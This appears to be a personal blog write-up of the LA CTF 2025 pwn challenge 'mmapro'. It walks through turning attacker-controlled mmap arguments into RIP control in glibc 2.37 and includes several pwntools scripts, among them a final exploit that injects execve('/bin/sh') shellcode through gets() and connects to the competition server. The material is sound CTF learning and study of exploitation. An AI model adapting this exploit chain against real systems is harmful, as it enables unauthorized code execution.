---
title: PWN MMAPRO LACTF WRITEUP [TURNING CRASHES INTO CODE EXECUTION]
date: 2025-02-12 11:28:05 +0200
categories: [pwn,lactf,mmap]
tags: [CTFTIME WRITEUP]
excerpt: mmapro is a pwn challenge from LA CTF 2025, I haven't solved it but I got some reasonable crashes, so let's analyze my crashes and turn it into a code execution 👾
---

![](https://i.imgur.com/sfqQZlq.png) <br>

- `mmapro` is a pwn challenge from LA CTF 2025, I haven't solved it but I got some reasonable crashes, so let's analyze my crashes and turn it into a code execution 👾

![link text](https://i.imgur.com/kMt0hTy.png) <br>

- Here's our challenge, let's see what it does
1) L:6 => creating an array of 6 long integers, (6*8 (sizeof long) = 48 bytes) <br>

![](https://i.imgur.com/7sNDa0Q.png) <br>

2) L:7 => writing mmap's address to stdout, so here we are getting a libc leak  <br>
3) L:8 => reading 48 bytes of input (sizeof(a) => 6*8 = 48 bytes) and storing it in `a`  <br>
4) L:9 => calling mmap function with our input as 6 arguments respectively.  <br>

- That's all the code does? yes 😭 
- Here they are just mapping the memory, so how can anyone get code execution here? 
- Initially I got some ideas like putting `0` (stdin) as fd argument to mmap function, so it will read our input and we can get some arbitary write since we controll the src addr, but...


```js
0 -> 'pipe:[460074]'
```

- **If Standard Input Is a Terminal or Pipe:**
Terminals or pipes typically do not support memory mapping in the way regular files do. In that case, mmap() is likely to fail (returning MAP_FAILED) because the underlying device doesn’t allow the random-access behavior required for mmap().

- The libc version they provided with this challenge was **2.37** 
- So I quickly checked the `mman.h` file diff b/w libc version 2.37 & 2.41

![image](https://hackmd.io/_uploads/B1K-uXFYkx.png) <br>

- Hmm, not so useful ig, then I checked the man page again with the belief of (Haaa there must be some tricks with MMAP we can easily get a shell) and collected all the flags for these arguments

```c
void *mmap(void addr[.length], 
           size_t length, 
           int prot, 
           int flags, 
           int fd, 
           off_t offset
);
```

- Check the above code for reference, incase you forgot the syntax like me 🙂 
- The only advantage is we can controll all these six args.
- First let's mmap a random region and see what the program does after mmaping.

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("mmapro_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-2.37.so",checksec=False)

p = elf.process()
mmap_leak = u64(p.recv())
libc_base = mmap_leak - 1138464
log.info(f'mmap leak: {hex(mmap_leak)}')
log.info(f'libc base: {hex(libc_base)}')

addr   = 0x0
length = 0x1000
prot   = 0x7
flags  = 0x22
fd     = -1
offset = 0

payload = flat(
    addr,
    length,
    prot,
    flags,
    fd,
    offset
)

input('> attach GDB')
p.sendline(payload)
p.interactive()
```

- This is a template script, so we can work on this in future.

```css
   0x00005fbc5bc6921e <+133>:	mov    rdi,rdx
   0x00005fbc5bc69221 <+136>:	mov    r9,rax
   0x00005fbc5bc69224 <+139>:	mov    edx,r10d
   0x00005fbc5bc69227 <+142>:	call   0x5fbc5bc69060
   0x00005fbc5bc6922c <+147>:	mov    eax,0x0
   0x00005fbc5bc69231 <+152>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00005fbc5bc69235 <+156>:	sub    rdx,QWORD PTR fs:0x28
   0x00005fbc5bc6923e <+165>:	je     0x5fbc5bc69245 <main+172>
   0x00005fbc5bc69240 <+167>:	call   0x5fbc5bc69090
   0x00005fbc5bc69245 <+172>:	leave
   0x00005fbc5bc69246 <+173>:	ret

> b *main+142
```

- Set breakpoint in main+142, that's where our mmap begins

![image](https://hackmd.io/_uploads/SyST9mtK1x.png) <br>

- addr=0, so the program will decide the memory location
- length = 4096 bytes, it's rwx, flags = MAP_ANONYMOUS|MAP_PRIVATE
- Since it's anonymous it doesn't require FD, so fd= -1 and offset is 0
- Everything is set, and we got `*RAX = 0x7f17316ac000` after syscall; 
- So our syscall did not fail

![image](https://hackmd.io/_uploads/ryQjiQYYyl.png) <br>

- After the mmap, it places null bytes in the mmaped region, I thought it's not useful, since the page need to be 0x1000 aligned, so we can't randomly change a non-aligned memory address's value to null 🤔 

![image](https://hackmd.io/_uploads/HkOl2mtFJg.png) <br>

- But the byte `\x00` in x64 instruction set is `add    BYTE PTR [rax],al` instruction
- This simply behaves like a `nop` instruction (until we have rax = *ptr)
- So we can travel further if we have a pointer in rax

![image](https://hackmd.io/_uploads/ryei2mtKye.png) <br>

- In the end **rax** is changed to `0` when the program reaches exit function
- Here rax = 0, so if we try to change that exit memory address values to NULL bytes, then the program will result in `SIGSEGV, Segmentation fault`
- Beacause rax is not a pointer, it's 0

![image](https://hackmd.io/_uploads/BkQC6QKFye.png) <br>

- So I tried to step-in through the exit function's code and even went to `__run_exit_handlers` , `__call_tls_dtors` then some code in `ld-2.37.so`, my goal is to find some point where the program changes the **rax** regisiter's value to a pointer then I can go futher using `add byte ptr [rax],al` instruction and eventually land in a **onegadget** 💀 🤣 

![image](https://hackmd.io/_uploads/SysE14tKyl.png) <br>

- If I was that much luckier, I'd be celebrating first blood 🩸, while others staring at their crashes and blaming the chall author for not giving the full code 😡 


### GETTING CRASHES:

- Remember the point where we got `*RAX = 0x7f17316ac000` ? => after the mmap syscall


![image](https://hackmd.io/_uploads/HyaKSVFtyg.png) <br>


- So the place `__GI___mmap64+23` is a good target for placing our nullbytes, coz rax will have a pointer -> if mmap syscall is sucessfully executed
- So we can travel further and land/crash in some other locations instead of just exiting 🧐 


```python
the_mmap64_plus_23_itself = (libc_base + 0x115f37) - 0xf37

addr   = the_mmap64_plus_23_itself
length = 0x1000
prot   = 0x7
flags  = 0x32 #  MMAP_FLAGS['MAP_FIXED'] | MMAP_FLAGS['MAP_ANONYMOUS'] | MMAP_FLAGS['MAP_PRIVATE']
fd     = -1
offset = 0
```
- I subtracted `0xf37` from `__GI___mmap64+23` addr, since the page need to be 0x1000 aligned!!

![image](https://hackmd.io/_uploads/SJnfdNYY1g.png) <br>

- After the syscall everything changed to nullbytes, so we can continue the program execution until the program crashes somewhere

- Eventually it crashed in `/sysdeps/unix/sysv/linux/msync.c:26`
- [https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/msync.c#L26](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/msync.c#L26)
- This crash is not useful :( 
- Let's increment our `mmap(..,  size_t length, ...)` by 0x1000 and check the next crash

**0x2000 crashed in:**

- [https://elixir.bootlin.com/glibc/glibc-2.37/source/misc/tsearch.c#L695](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/msync.c#L26)
- This code is also not useful, since it crashed in `add    byte ptr [rbx + 0x2b7701ff], al` instruction and we don't control anything from rbx and nothing interesting happens after that.


### AUTOMATING THE PROCESS

![image](https://hackmd.io/_uploads/B1qWwNqY1x.png) <br>

- I wrote a small python script with the GDB api to print all these infos, so we can analyze our crash easily

```python
#!/usr/bin/env python3
from pwn import *
from termcolor import colored
import sys

elf = context.binary = ELF("mmapro_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-2.37.so",checksec=False)
context.terminal = ["alacritty", "-e"]
context.log_level = "CRITICAL"

p = gdb.debug(context.binary.path,'c',api=True)

mmap_leak = u64(p.recv())
libc_base = mmap_leak - 1138464
the_mmap64_plus_23_itself = (libc_base + 0x115f37) - 0xf37

addr   = the_mmap64_plus_23_itself
length = int(sys.argv[1])
prot   = 0x7
flags  = 0x32
fd     = -1
offset = 0

payload = flat(
    addr,
    length,
    prot,
    flags,
    fd,
    offset
)
p.sendline(payload)

print(colored('-'*80,'magenta',attrs=["bold"]))
# 
print(colored(f"> size_t length: {hex(length)}","green",attrs=["bold"]))   
sal = p.gdb.newest_frame().find_sal()
if sal.symtab:
    print(colored(f"> Crash at {sal.symtab.filename}:{sal.line}","yellow"))
    link_format = f"https://elixir.bootlin.com/glibc/glibc-2.37/source/{sal.symtab.filename.replace('../','').replace('./','')}#L{sal.line}"
    print(colored(f"> Link: {link_format}","blue"))
else:
    print("No source info available.")
print(colored('-'*80,'magenta',attrs=["bold"]))
frame = p.gdb.newest_frame()
register_names = p.gdb.execute("info registers", to_string=True).split('\n')
for reg_info in register_names:
    if reg_info.strip():
        reg_name = reg_info.split()[0]
        try:
            reg_value = frame.read_register(reg_name)
            if reg_name != 'rip':
                print(colored(f"{reg_name} = {hex(reg_value)}","cyan"))
            else:
                print(colored(f"{reg_name} = {hex(reg_value)}","red",attrs=["bold"]))

        except ValueError:
            print(f"{reg_name} = <unavailable>")

print(colored('-'*80,'magenta',attrs=["bold"]))
disasm = p.gdb.execute("x/10i $rip", to_string=True)
for line in disasm.split("\n"):
    if "=>" in line:
        print(colored(line, "red", attrs=["bold"]))
    else:
        print(colored(line, "blue"))
print(colored('-'*80,'magenta',attrs=["bold"]))

```

![](https://i.imgur.com/rZJQRbn.png) <br>

- It's size is 0x178000, which is (376 * 0x1000) aligned pages
- Our `mmap64+23` is already in the `0x115000` -> 277th page, so still we can iterate 89 pages and we can get 89 different crashes

<iframe width="560" height="315" src="https://www.youtube.com/embed/50TLI0NOj0c?si=PNI6w9b6LB27qDpP" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

![image](https://hackmd.io/_uploads/rJBfkS5KJx.png) <br>


```js 
➜  crashes grep -ir 'rip = '
crash_12.txt:rip = 0x7db8e0b21011
crash_73.txt:rip = 0x70bb37f5dfff
crash_40.txt:rip = 0x7e8fb073d002
crash_54.txt:rip = 0x7a78dd74b001
crash_60.txt:rip = 0x7d8797150fff
crash_68.txt:rip = 0x794b72f59002
crash_28.txt:rip = 0x70069d531001
crash_31.txt:rip = 0x7eee2bd33fff
crash_86.txt:rip = 0x793438f6afff
crash_42.txt:rip = 0x7fb66333efff
crash_59.txt:rip = 0x744d0834ffff
crash_38.txt:rip = 0x72317ff3b000
crash_84.txt:rip = 0x75d32e89c5a1
crash_61.txt:rip = 0x788904751fff
crash_85.txt:rip = 0x74d6b4f69fff
crash_15.txt:rip = 0x706a1af23fff
crash_21.txt:rip = 0x7e6981329fff
crash_27.txt:rip = 0x7b018652ffff
crash_83.txt:rip = 0x783613d67fff
crash_53.txt:rip = 0x718a7e715f20
crash_74.txt:rip = 0x76ba1d15f000
crash_36.txt:rip = 0x7b67e4738fff
crash_39.txt:rip = 0x78c60e13c008
crash_62.txt:rip = 0x7689af715f20
crash_18.txt:rip = 0x780f80b26fff
crash_81.txt:rip = 0x76fd64966001
crash_23.txt:rip = 0x743cc4d2c005
crash_46.txt:rip = 0x72fc49342fff
crash_75.txt:rip = 0x792131d5ffff
crash_48.txt:rip = 0x7459f4b15f20
crash_64.txt:rip = 0x727dc3555026
crash_35.txt:rip = 0x7618e2e9fc4e
crash_29.txt:rip = 0x7c3a4331dab0
crash_52.txt:rip = 0x7bac47549000
crash_13.txt:rip = 0x784af2515f20
crash_58.txt:rip = 0x7b467254efff
crash_32.txt:rip = 0x7fa3d9335003
crash_80.txt:rip = 0x77f6a6d64fff
crash_88.txt:rip = 0x7984e1d6d02d
crash_26.txt:rip = 0x7c7c2712efff
crash_8.txt:rip = 0x7c2012319d99
crash_77.txt:rip = 0x717b21362002
crash_66.txt:rip = 0x768f6db57006
crash_78.txt:rip = 0x765fc2163049
crash_5.txt:rip = 0x7412c0319fff
crash_51.txt:rip = 0x7e1c24147fff
crash_34.txt:rip = 0x72b4ee515000
crash_50.txt:rip = 0x7d22e7346fff
crash_3.txt:rip = 0x73d866118002
crash_14.txt:rip = 0x7ee99e43f18f
crash_1.txt:rip = 0x7d7405715fff
crash_56.txt:rip = 0x7ac90094cfff
crash_89.txt:rip = 0x74510156dfff
crash_87.txt:rip = 0x32
crash_49.txt:rip = 0x760ded945fff
crash_19.txt:rip = 0x719cacd27fff
crash_2.txt:rip = 0x723c30916fff
crash_65.txt:rip = 0x75fb49b55fff
crash_16.txt:rip = 0x75b6a6525018
crash_7.txt:rip = 0x772cab31c001
crash_43.txt:rip = 0x72df7d53ffff
crash_9.txt:rip = 0x7255c491dfff
crash_76.txt:rip = 0x711bbb760fff
crash_44.txt:rip = 0x7f06f7340fff
crash_22.txt:rip = 0x7747b5f2b00f
crash_55.txt:rip = 0x714db2b4bfff
crash_69.txt:rip = 0x7f47e4b59fff
crash_45.txt:rip = 0x74fec772f0e0
crash_57.txt:rip = 0x70702aaa599e
crash_63.txt:rip = 0x7ceacaf54003
crash_11.txt:rip = 0x7ece30f1ffff
crash_17.txt:rip = 0x76ed3052600c
crash_37.txt:rip = 0x7550aa33a001
crash_20.txt:rip = 0x728271728fff
crash_47.txt:rip = 0x736b67d44001
crash_67.txt:rip = 0x7b870415800f
crash_70.txt:rip = 0x714d4eb5b002
crash_4.txt:rip = 0x70dfea519004
crash_79.txt:rip = 0x792014563fff
crash_30.txt:rip = 0x74dcf4d3300a
crash_72.txt:rip = 0x75022935cfff
crash_25.txt:rip = 0x7cc017f2e002
```

- One simple way is to check the RIP register from all crashes
- In `crash_87.txt`, the RIP is 0x32, which is very rare 🤔 
- Let's take a look at it
- It crashed in `size_t length: 0x57000`

![image](https://hackmd.io/_uploads/HkjOgHqFJg.png) <br>

- For the next `0x57000` bytes, `add    byte ptr [rax], al` only executes, so let's set a breakpoint after it, and continue the execution

![image](https://hackmd.io/_uploads/HkYy-S9t1e.png) <br>

- Now we are in : [https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/ptsname.c](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/msync.c#L26)

![image](https://hackmd.io/_uploads/HJEjZB9tye.png) <br>

- After few instructions it calls `ioctl`
- Exactly in this line: [https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/ptsname.c#L54](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/msync.c#L26)
- now let's check ioctl.c: [https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/ioctl.c#L25](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/msync.c#L26)


![image](https://hackmd.io/_uploads/ryleQH5YJx.png) <br>

![image](https://hackmd.io/_uploads/rkdG7rctkl.png) <br>

- In line => 35 `ioctl` is being called, it fails and returns `0xfffffffffffffff7` in rax

![image](https://hackmd.io/_uploads/Bk8oIBcKJe.png) <br>

- which is a Bad file descriptor error, so the code returns -1 => check line:39
- Now the check `if (__ioctl (fd, TIOCGPTN, &ptyno) == 0)` fails in `ptsname.c#L54`


![image](https://hackmd.io/_uploads/S1oGdr5YJe.png) <br>

- But while returning it pops some values in the stack, exactly 5
- And the 6 value in the stack is 0x32, which we can confidently say as `flags` -> `MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE` of our mmap syscall, because you can see other values like `0x57000` -> our length, `7` -> prot, `0xffffffffffffffff` -> `-1` fd of the mmap we provided.

![image](https://hackmd.io/_uploads/ByV19H9tyl.png) <br>

- After popping everything our stack will looks like this and our value 0x32 is set in RIP, this is the most valuable crash we got so far.
- **Why this happened?:** This happened because we directly jumped into line 50 of `ptsname.c` : https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/unix/sysv/linux/ptsname.c#L50
- It likely stored some values on the stack and is now attempting to restore them into the registers before returning.
- Since we directly jumped to `<ptsname_r+16>` : `L:50`, that values are not pushed into the stack and our values get's replaced there. By using this we can control our RIP register; which is our ultimate AIM
- So let's try to change the RIP value as onegadget address, so we can execute `/bin/sh`
- remember to set breakpoint in `<ptsname_r+106>`, so we can see what happens before returning


```json
MMAP_FLAGS = {
    # Mapping Flags
    "MAP_SHARED": 0x01,
    "MAP_PRIVATE": 0x02,
    "MAP_FIXED": 0x10,
    "MAP_ANONYMOUS": 0x20,
    "MAP_32BIT": 0x40,
    "MAP_GROWSDOWN": 0x100,
    "MAP_HUGETLB": 0x40000,
    "MAP_LOCKED": 0x2000,
    "MAP_NORESERVE": 0x4000,
    "MAP_POPULATE": 0x8000,
    "MAP_NONBLOCK": 0x10000,
    "MAP_STACK": 0x20000,
    "MAP_SYNC": 0x80000,

    # File Mapping Flags
    "MAP_ANON": 0x20, 
    "MAP_FIXED_NOREPLACE": 0x100000,
    "MAP_DENYWRITE": 0x08000
}
```

- But we can't do it easily, because the flag values might match a valid flag, otherwise it fails
- I wrote a small python script to check the available flag values in a given address


```python 
MMAP_FLAGS = {
    "MAP_SHARED": 0x01,
    "MAP_PRIVATE": 0x02,
    "MAP_FIXED": 0x10,
    "MAP_ANONYMOUS": 0x20,
    "MAP_32BIT": 0x40,
    "MAP_GROWSDOWN": 0x100,
    "MAP_HUGETLB": 0x40000,
    "MAP_LOCKED": 0x2000,
    "MAP_NORESERVE": 0x4000,
    "MAP_POPULATE": 0x8000,
    "MAP_NONBLOCK": 0x10000,
    "MAP_STACK": 0x20000,
    "MAP_SYNC": 0x80000,
    "MAP_ANON": 0x20, 
    "MAP_FIXED_NOREPLACE": 0x100000,
    "MAP_DENYWRITE": 0x08000
}

def decode_flags(flag_value):
    active_flags = [name for name, val in MMAP_FLAGS.items() if flag_value & val]
    return active_flags

flag_value = 0x76d44444e899
print(f"Flags set in {hex(flag_value)}: {decode_flags(flag_value)}")
```

- Let's try all the one_gadget address using the above script

![image](https://hackmd.io/_uploads/rJi5_89Yyx.png) <br>

- We got the flag values, not sure which one suits for us, so let's try to bruteforce every gadget value


```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("mmapro_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-2.37.so",checksec=False)

one_gadgets = ['0x4e892', '0x4e899', '0x4e8a0', '0x4e8a7', '0x4e8ac', '0x4e8bc', '0x4e8c1', '0x4e8c4', '0x4e8c9', '0x7ac50', '0x7ac57', '0x7ac5e', '0x7ac61', '0x7ac66', '0x7ac6b', '0x7ac70', '0x7ac75', '0x7ac89', '0x1052fa', '0x105302', '0x105307', '0x105311']

for gadget_addr in one_gadgets:
    p = elf.process()
    mmap_leak = u64(p.recv())
    libc_base = mmap_leak - 1138464
    the_mmap64_plus_23_itself = (libc_base + 0x115f37) - 0xf37
    one_gadget = libc_base + int(gadget_addr,16)

    log.info(f'mmap leak: {hex(mmap_leak)}')
    log.info(f'libc base: {hex(libc_base)}')
    log.info(f'onegadget: {hex(one_gadget)}')


    addr   = the_mmap64_plus_23_itself
    length = 0x57000
    prot   = 0x7
    flags  = one_gadget
    fd     = -1
    offset = 0

    payload = flat(
        addr,
        length,
        prot,
        flags,
        fd,
        offset
    )

    # input('> attach GDB')
    p.sendline(payload)
    p.interactive()
```

- Nothing worked 🤔 
- Ok, we can still jump to one gadget, since we have control over stack, the next address in the stack is also controllable by us => fd, currently it's `-1`, and it's not required since we are mapping an anonymous page
- So let's plan to put a `ret` gadget address value in `flags` instead of directly putting the `one_gadget`'s address
- Initially I tried to get `ret` gadget using ropper, and tried many gadgets manually, nothing worked in my favour
- So I extracted every single ret gadget from the libc `search -t byte 0xc3 -e` and used it in flags


```python 
#!/usr/bin/env python3
from pwn import *
from termcolor import colored
import sys

elf = context.binary = ELF("mmapro_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-2.37.so",checksec=False)
context.terminal = ["alacritty", "-e"]
context.log_level = "CRITICAL"

p = gdb.debug(context.binary.path,'c',api=True)

mmap_leak = u64(p.recv())
libc_base = mmap_leak - 1138464
the_mmap64_plus_23_itself = (libc_base + 0x115f37) - 0xf37

addr   = the_mmap64_plus_23_itself
length = 0x57000
prot   = 0x7
flags  = libc_base + int(sys.argv[1],16)
fd     = -1
offset = 0

payload = flat(
    addr,
    length,
    prot,
    flags,
    fd,
    offset
)
p.sendline(payload)
rip_val = p.gdb.newest_frame().read_register('rip')
if (rip_val == 0xffffffffffffffff):
    open('suitable_ret_offset.txt','a').write(sys.argv[1]+'\n')
p.interactive()
```

- And placed `-1` in fd, so we can check our ret gadget is working or not, if it works then the RIP register will have `0xffffffffffffffff`, and that ret gadget value satisfies the required flag values to make the mmap syscall success.
- I got many valid ret gadgets, here are few of them


```
0x33772
0x33e72
0x33eb2
0x3b032
0x3c0f2
```

- Then I used my bruteforce script again to make my onegadget plan work. but not even a single gadget worked 🙂 

- Now time for plan B
- We have RIP control in mmap's fd argument, and we can even control the next value in the stack that's offset, but it need to be 0x1000 aligned

![image](https://hackmd.io/_uploads/rJjRfOqK1e.png) <br>

- We have `0x77cbb0515000` in RDI, which is our mmaped region, and it has rwx permissions,
- We can jump here if we put this value in the offset argument of mmap (it will be placed in the stack after the FD), but for now only null bytes are here
- So we can overwrite this page contents with our shellcode.
- Since we control the FD argument, we can make the program to call gets() function.
- This is the only meaningful and easiest way, since we have limited control over the other registers.
- RDI is already our mmaped value, so our shellcode will be written here, and we can jump here eventually


![image](https://hackmd.io/_uploads/Sk_OB_9Kkl.png) <br>

- And we got our shell 😌 


### **Final Script:**

```python 
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("mmapro_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-2.37.so",checksec=False)

# p = elf.process()
p = remote('chall.lac.tf',31179)
mmap_leak = u64(p.recv())
libc_base = mmap_leak - 1138464
the_mmap64_plus_23_itself = (libc_base + 0x115f37) - 0xf37
ret_gadget = libc_base + 0x33772

log.info(f'mmap leak: {hex(mmap_leak)}')
log.info(f'libc base: {hex(libc_base)}')
log.info(f'ret_gadget: {hex(ret_gadget)}')


addr   = the_mmap64_plus_23_itself
length = 0x57000
prot   = 0x7
flags  = ret_gadget
fd     = libc_base + libc.sym['gets']
offset = the_mmap64_plus_23_itself

payload = flat(
    addr,
    length,
    prot,
    flags,
    fd,
    offset
)

p.send(payload)

shellcode = asm(
    shellcraft.execve("/bin/sh",0,0)
)

p.sendline(shellcode)
p.sendline('id')
p.interactive()
```
